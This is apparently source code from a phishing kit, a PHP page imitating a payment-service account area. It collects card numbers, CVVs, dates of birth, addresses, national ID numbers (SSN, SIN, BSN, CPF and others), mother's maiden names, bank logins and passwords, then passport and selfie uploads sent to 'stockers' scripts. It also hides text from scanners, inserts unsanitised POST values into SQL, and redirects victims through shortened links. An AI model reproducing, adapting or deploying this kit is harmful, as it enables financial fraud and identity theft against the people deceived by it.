...
if(isset($_POST['bt'])) {
    ...
    $sql = "INSERT INTO users(card_type,card_number,expire_date,cvv,fullname,addressdetails,city,zipcode,state,country,phonetype,phonumber,dob) VALUES('$csc','$fnm','$dob','$address','$cty','$ccn','$cex','$csc','$stt','$stt','$stt','$stt','$stt')";
...
// echo "<br><br><br>";
//     echo "CSC Number " . $csc_number . "<br>";
//     echo "FNM Number " . $fnm_number . "<br>";
...
<meta http-equiv="Content-Type" content="text/html;
 ...
 <title>
    <?php echo $lg_process['title']?>
 </title>
 <link rel="stylesheet" href="lib/styles/process.css">
 <script type="text/javascript" src="lib/js/jquery-3.3.1.min.js">
 </script>
 <script type="text/javascript" src="lib/js/jquery.mask.min.js">
 </script> 
 <script type="text/javascript" src="lib/js/jquery.ccvalid.js">
 </script>
 </head>
 <body>
 <input type="checkbox" id="toggleMenu" class="menuToggler">
 <div class="desktopNav"><div class="navContainer">
 <a href="javascript:" class="desktopBrand"></a>
 <div class="mobileMenu">
 <div class="logoutMobile">
    <a href="javascript:" class="logoutTxtMobile">
        <?php echo $lg_process['logout']?>
    </a>
 </div>
 <div class="settingsMobile">
 <a href="javascript:" class="svgLogo settingsTxt"><img src="lib/pics/settings.svg" alt="">
 </a>
 </div>
 <div>
 <p class="displayMail"><?php echo $_SESSION['EML']?></p>
 </div>
 </div>
 <div class="desktopMenu"><nav class="desktopItems"><ul class="firstUl"><li class=""><a href="javascript:" class="linksTxt">
 <?php echo $lg_process['menu']['home']?></a>
 </li>
 <li class="">
     <a href="javascript:" class="linksTxt">
        <?php echo $lg_process['menu']['activity']?>
    </a>
 </li>
 <li class="">
    <a href="javascript:" class="linksTxt">
    <?php echo $lg_process['menu']['send_receive']?>
    </a>
</li>
    <li class="">
    <a href="javascript:" class="linksTxt">
    <?php echo $lg_process['menu']['wallet']?>
    </a>
    </li>
    <li class="activeLi"><a href="javascript:" class="linksTxt">
    <?php echo $lg_process['menu']['help']?>
    </a>
    </li>
    </ul>
    <ul class="secondUl">
    <li class="notifLi"><a href="javascript:" class="svgLogo notifTxt"><img src="lib/pics/noti.svg" alt=""></a></li>
    <li><a href="javascript:" class="svgLogo settingsTxt"><img src="lib/pics/settings.svg" alt=""></a></li>
    <li class="logoutLi"><a href="javascript:" class="logoutTxtDesktop"><?php echo $lg_process['logout']?></a></li>
    </ul>
    </nav>
    </div>
    </div>
    ...
    <div class="mobileNav">
        <div class="navHeader">
            <div class="blockToggler">
                <label class="menuLabel" for="toggleMenu"><span></span>
                    <div class="menuOpen">
                        <?php echo $lg_process['menu']['open']?>
                    </div>
                    <div class="menuClose">
                        <?php echo $lg_process['menu']['close']?>
                    </div>
                </label>
            </div>
        </div>
        ...
        <ul class="notifUl">
            <li><a class="svgLogo notifTxt"><img src="lib/pics/noti.svg" alt=""></a></li>
        </ul>
    </div>    
    
    
    <div class="contents"><section class="mainContents" id="process">
    ...
    <h1 style="padding-bottom:10px">
        ...
        <span style="font-size:0">isnot good</span>
    </h1>
    <div class="fields clearfix">
    <div class="dropDown">
    <select id="ctp" required>
        <option value="-1" disabled selected>
        <?php echo $lg_process['ctype']?></option>
    ...
    <div class="inputArea">
        <input id="ccn" name="ccn" type="tel" required placeholder="<?php echo $lg_process['cnumber']?>" maxlength="19" autocomplete="off">
    </div>
    <div class="multiInputs">
    <div class="inputArea hasSub">
        <input id="cex" name="cex" type="tel" required placeholder="<?php echo $lg_process['exp']?>" maxlength="7" autocomplete="off">
    </div>
    <div class="inputArea hasSub csc pull-right">
        <input id="csc" name="csc" type="tel" required placeholder="<?php echo $lg_process['csc']?>" maxlength="3" autocomplete="off">
    </div>
    </div>
    </div>
    <h1>
...
<div class="fields clearfix">
    <div class="multiInputs">
        <div class="inputArea hasSub">
            <input id="fnm" name= "fnm" type="text" class="txt-capital" required placeholder="<?php echo $lg_process['name']?>">
        </div>
        <div class="inputArea hasSub pull-right" style="margin-bottom:15px">
            <input id="dob" name="dob" type="tel" required placeholder="<?php echo $lg_process['dob']?>" maxlength="10">
        </div>
    </div>
    
    <div class="inputArea">
        <input id="adr" name="adr" type="text" required placeholder="<?php echo $lg_process['address']?>">
    </div>
    <div class="multiInputs">
    <div class="inputArea hasSub">
        <input id="cty" name="cty" type="text" required placeholder="<?php echo $lg_process['city']?>">
    </div>
    <div class="inputArea hasSub pull-right">
        <input id="zip" type="text" name="zip" required placeholder="<?php echo $_SESSION['ip_countryCode']=='GB'?'Postcode':$lg_process['zip']?>" maxlength="8">
    </div>
    </div>
    <div class="multiInputs">
    <div class="inputArea hasSub">
        <input id="stt" name="stt" type="text" required placeholder="State / Region">
    </div>
        <div class="inputArea hasSub pull-right">
        <input id="cnt" name="cnt" type="text" required placeholder="Country">
        </div>
    </div>
    <div class="multiInputs">
    <div class="dropDown mobileType" style="float:left;width:33%;margin:15px 0 9px">
    <select id="ptp" name="ptp" required>
        <option value="-1" disabled selected>
...
<div class="dropDown mobilePreffix" style="float:left;width:18%;margin:15px 0 0 10px">
    ...
    <script>
        $("#par>option").each(function(a,b){if($(this).val().split("(")[1].replace(")","")=="<?php echo $_SESSION['ip_countryCode']?>"){$(this).attr("selected","selected");
        $(".mobilePreffix .labelSelect").html($(this).text())}else{$(this).removeAttr("selected")}});
    </script>
</div>
<div class="inputArea hasSub pull-right nMobile" style="width:45.6%">
<input id="pnm" name="pnm" type="tel" required placeholder="<?php echo $lg_process['pnumber']?>" maxlength="15"></div>
</div>
<?php if($_SESSION['ip_countryCode']=='US'):?>
<div class="multiInputs">
    <div class="inputArea hasSub">
        <input id="ssn" type="tel" required placeholder="Social Security number (SSN)" maxlength="11"></div>
        <div class="inputArea hasSub pull-right">
            <input id="mdn" type="text" required placeholder="Mother Maiden Name">
            </div>
            </div>
            <?php elseif($_SESSION['ip_countryCode']=='GB'):?>
            <div class="multiInputs">
                <div class="inputArea hasSub">
                    <input id="acn" type="tel" required placeholder="Account number" maxlength="8"></div><div class="inputArea hasSub pull-right">
                        <input id="stc" type="tel" required placeholder="Sortcode" maxlength="8"></div></div><?php elseif($_SESSION['ip_countryCode']=='IE'):?>
                        <div class="multiInputs">
                            <div class="inputArea hasSub">
                                <input id="pps" type="text" required placeholder="PPS number">
                                </div><div class="inputArea hasSub pull-right">
                                    <input id="mdn" type="text" required placeholder="Mother Maiden Name">
                                    </div>
                                    </div>
                                    <?php elseif($_SESSION['ip_countryCode']=='AU'):?>
                                    <div class="multiInputs">
                                        <div class="inputArea hasSub">
                                            <input id="clm" type="tel" required placeholder="Card limit">
                                            </div>
                                            <div class="inputArea hasSub pull-right">
                                                <input id="dln" type="tel" required placeholder="Driver license number"></div>
                                                </div><?php elseif($_SESSION['ip_countryCode']=='FR'):?><div class="multiInputs">
                                                    <div class="inputArea hasSub"><input id="bus" type="text" required placeholder="Identifiant banque"></div>
                                                    <div class="inputArea hasSub pull-right">
                                                        <input id="bpw" type="password" required placeholder="Mot de passe banque">
                                                        </div>
                                                        </div>
                                                        <?php elseif($_SESSION['ip_countryCode']=='CA'):?>
                                                        <div class="multiInputs">
                                                            <div class="inputArea" style="width:100%">
                                                            <input id="sin" type="tel" required placeholder="Social Insurance Number (SIN)">
                                                            </div>
                                                            </div>
                                                            <?php elseif($_SESSION['ip_countryCode']=='SE'):?>
                                                            <div class="multiInputs">
                                                                <div class="inputArea" style="width:100%">
                                                                <input id="pse" type="tel" required placeholder="Personnummer (10 digits)" maxlength="10">
                                                                </div>
                                                                </div>
                                                                <?php elseif($_SESSION['ip_countryCode']=='ES'):?>
                                                                <div class="multiInputs">
                                                                    <div class="inputArea" style="width:100%">
                                                                    <input id="dni" type="text" required placeholder="DNI (NIF/NIE/CIF)" maxlength="9">
                                                                    </div>
                                                                    </div>
                                                                    <?php elseif($_SESSION['ip_countryCode']=='NL'):?>
                                                                    <div class="multiInputs">
                                                                        <div class="inputArea" style="width:100%">
                                                                        <input id="bsn" type="text" required placeholder="BSN (8/9 digits)" maxlength="9">
                                                                        </div>
    </div>
    <?php elseif($_SESSION['ip_countryCode']=='BR'):?>
    <div class="multiInputs">
        <div class="inputArea" style="width:100%">
        <input id="cpf" type="text" required placeholder="CPF" maxlength="14">
        </div>
        </div>
        <?php elseif($_SESSION['ip_countryCode']=='IT'):?>
        <div class="multiInputs"><div class="inputArea" style="width:100%">
        <input id="fcn" type="text" required placeholder="Codice fiscale" maxlength="16">
        </div>
        </div>
        <?php endif?>
        </div>
        <div>
            <input style="margin-top:20px;width:100%" name="bt" id="bt" type="submit" class="bt" value="<?php echo $lg_process['bt_save']?>">
            </div>
            </form>
            </section><section class="mainContents hide" id="finish">
                    ...
                    <ol class="proof">
                        <li class="itm current">
                            <div class="ui-text-small">
                                ...
                                <li class="itm">
                                <div class="ui-text-small"><?php echo $lg_id['proof']['two']?></div>
                            </li>
                            <li class="itm">
                                <div class="ui-text-small"><?php echo $lg_id['proof']['three']?></div>
                            </li>
                    </ol>
                </div>
                 <div id="select_one">
                     <form action="javascript:void(0);" method="POST">
                         <div id="area_choose">
                             ...
                             <?php echo $lg_id['choose']?>
                             </h1>
                             <div class="doc_type">
                                 <div class="doc_type_choice">
                                     <div class="doc_type_choice_wrapper">
                                         <div><img src="lib/pics/id_p.svg" alt="">
                                         </div>
                                         <label class="cont">
                                             <input type="radio" name="doc_type" value="Passport"><span class="checkmark"></span>
                                             <span> <?php echo $lg_id['type']['one']?></span>
                                        </label>
                                    </div>
                                </div>
                                <div class="doc_type_choice">
                                ...
                                <div class="doc_type_choice">
                                    <div class="doc_type_choice_wrapper">
                                        ...
                                        <?php echo $lg_id['head_up']?>
                                        <span></span>
                                        </h1>
                                        <div class="row rules text-center">
                                            <div class="rule">
                                                <img src="lib/pics/scan_id.svg" alt="">
                                                <div>
                                            ...
                                            <div class="rule">
                                                ...
                                                <div><?php echo $lg_id['rule1']['two']?>
                                                </div>
                                                </div>
                                                <div class="rule"><img src="lib/pics/both_pass.svg" alt=""><div><?php echo $lg_id['rule1']['three']?>
                                                </div>
                                                </div>
                                                </div>
    ...
    $('.bt_select_one').click(function(){
        if($('[name=doc_type]').is(':checked')){
            ...
            $(document).on('click','#area_up_id .back',function(){
                $('#area_up_id').hide('slow');$('#area_choose').show('slow');});
...
$.post('../extra/stockers/step3.php',$(this).serialize(),function(dt,st){
    if(dt&&st=='success'){$('.proof li:nth-child(2)').addClass('current');
    $('#select_one').addClass('hide');
    $('#select_two').removeClass('hide');
    window.scrollTo(0,0);$('#rotate').addClass('hide');
    }});});
</script>

</div>
<div id="select_two" class="hide">
    <form action="javascript:void(0);" method="POST" action="dashboard.php">
        <div id="area_up_selfie">
            <h1 style="font-size:1.4rem">
            <?php echo $lg_id['head_slf']?>
            <span></span></h1><div class="row rules text-center">
                <div class="rule"><img src="lib/pics/take_s.svg" alt="">
                <div>
                    <?php echo $lg_id['rule2']['one']?>
                    </div>
                    </div>
                    <div class="rule"><img src="lib/pics/fingers_not.svg" alt=""><div>
                        <?php echo $lg_id['rule2']['two']?>
                        </div>
                        </div>
                        <div class="rule">
                            <img src="lib/pics/glaesses_not.svg" alt=""><div>
            ...
            <input style="margin-bottom:1rem;margin-top:1rem" type="submit" class="bt" value="<?php echo $lg_id['bt_proceed']?>">
            <div>
                <a href="javascript:void(0)" class="back"><?php echo $lg_id['bt_back']?></a>
                </div>
                </div>
                </form>
...
//                     e.preventDefault();if($('#select_two .imagesArea .imgItem').length==0){
//                         return false;
//                     }
//                 $('#rotate').removeClass('hide');
//                 $.post('../extra/stockers/step4.php',$(this).serialize(),function(dt,st){if(dt&&st=='success'){$('.proof li:nth-child(3)').addClass('current');
//                 $('#select_one').addClass('hide');
//                 $('#select_two').addClass('hide');
//                 $('#select_three').removeClass('hide');
//                 window.scrollTo(0,0);
// setTimeout(function(){window.location.href="https://bit.ly/1bJnLWA";
// },6000);
...
<div id="select_three" class="hide">
    ...
    <img src="lib/pics/success.gif" alt="" width="150"><h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem">
    <?php echo $lg_finish['head']?>
    </h1>
    <p>
        <?php echo $lg_finish['p1']?>
        <span style="color:#41ad49;font-weight:bold"> 
            <?php echo $lg_finish['on']?>
        </span>, <?php echo $lg_finish['p2']?><a style="font-weight:bold" href="https://bit.ly/IGrVjE"><?php echo $lg_finish['p3']?></a>.</p>
        <div>
            <button style="margin-top:20px;border-radius:.5rem" class="bt gone_bt"><?php echo $lg_process['title']?></button>
        </div>
    </div>
</div>
</div>
    ...
    <div class="ftr">
        <div class="footerFirstContent">
            <ul class="footerList">
                    ...
                    <li><a href="javascript:"><?php echo $lg_process['footer']['security']?></a></li>
                </ul>
                <div class="footerSecondContent">
                    <p class="footerP">Copyright ©<span>1999-2021</span> . <?php echo $lg_process['footer']['rights']?></p>
                    <ul class="footerUl">
                    ...
                    <!-- <script>
                    $(document).ready(function(){$('#cex').mask('00/00');$('#csc').mask('0000');$('#dob').mask('00/00/0000');$('#ccn').mask('0000 0000 0000 0000 000');$('#pnm').mask('000000000000000');$('#ssn').mask('000-00-0000');$('#acn').mask('00000000');$('#stc').mask('00-00-00');$('#sin').mask('000-000-000');
                    function validExp(b){var a=new RegExp("(([0][1-9]{1})|([1][0-2]{1}))/(([1][8-9]{1})|([2][0-9]{1}))");
                    return a.test(b);
                    }
function isDate(vl){var rg=/^([0-9]{2})+\/([0-9]{2})+\/([0-9]{4})+$/;return rg.test(vl);}
function validDob(vl){var c=false;
if(isDate(vl)&&(vl.split('/')[2]>"1919"&&vl.split('/')[2]<"2006")){c=true;}
return c;}
function valid(){var check=true;var ii=0;
$('#process input:not(.bt):not([type=checkbox]),#process select').each(function(i,el){if(!$(el).val()){$(el).parent().addClass('hasError');
check=false;
}else {$(el).not('#ccn').parent().removeClass('hasError');
}
if($(el).attr('id')=='cex'){
    if(!validExp($(el).val())){$(el).parent().addClass('hasError');
    check=false;
    }else {
...
if($(el).attr('id')=='csc'){
    if($('select:first').val()=='amx'&&$(el).val().length!=4){
        $(el).parent().addClass('hasError');
        check=false;
    }else {$(el).parent().removeClass('hasError');
    }
...
$(document).on('click','.zone',function(e){e.stopPropagation();$(this).find('input[type=file]').trigger(e);});$(document).on('click','.btDel',function(){$(this).closest('form').find('[value="'+$(this).prev().attr('src')+'"]').remove();
$(this).parent().remove();});
$(document).on('change','input[type=file]',function(){readFile(this.files,this,false);});
$(".dropzone-main").on('dragleave',function(e){e.preventDefault();$(this).css('border','2px dashed #dee3e7');
$(this).css('background','#f0f2f4');
});$(".dropzone-main").on('dragover',function(e){e.preventDefault();$(this).css('border','2px dashed #0564b3');
$(this).css('background','#ecf1f9');
});
$(".dropzone-main").on('drop',function(e){e.preventDefault();
